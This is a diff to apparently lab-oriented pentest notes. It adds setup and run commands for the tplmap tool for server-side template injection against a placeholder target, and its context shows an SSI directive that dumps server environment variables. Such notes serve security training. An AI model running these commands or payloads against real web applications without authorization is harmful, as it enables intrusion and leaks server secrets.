@@ -74,7 +74,17 @@ function> }
 // Print all variables
 <!--#printenv -->
 ```
-
+### tplmap.py
+### SSTI Exploitation Example 1
+```
+[/htb]$ git clone https://github.com/epinna/tplmap.git
+[/htb]$ cd tplmap
+[/htb]$ pip install virtualenv
+[/htb]$ virtualenv -p python2 venv
+[/htb]$ source venv/bin/activate
+[/htb]$ pip install -r requirements.txt
+[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
+```
 ### Useful Links
 
 git clone https://github.com/epinna/tplmap.git
